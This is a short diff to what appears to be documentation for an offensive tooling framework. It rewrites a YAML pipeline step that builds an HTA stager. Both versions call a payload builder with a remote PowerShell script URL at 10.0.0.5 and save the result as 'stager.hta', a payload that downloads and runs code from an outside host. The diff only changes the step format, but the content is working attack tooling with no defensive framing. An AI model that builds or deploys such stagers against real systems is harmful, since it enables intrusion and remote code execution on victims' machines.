@@ -22,11 +22,11 @@ payloads.save(hta, "stager.hta")
 ```yaml
 steps:
   - name: build hta
-    run: |
-      python - <<'PY'
-      from ofx.api import payloads
-      content = payloads.build_hta("http://10.0.0.5/s.ps1")
-      path = payloads.save(content, "stager.hta")
-      print(f"wrote {path}")
-      PY
+    module: python
+    with:
+      script: |
+        from ofx.api import payloads
+        content = payloads.build_hta("http://10.0.0.5/s.ps1")
+        path = payloads.save(content, "stager.hta")
+        print(f"wrote {path}")
 ```
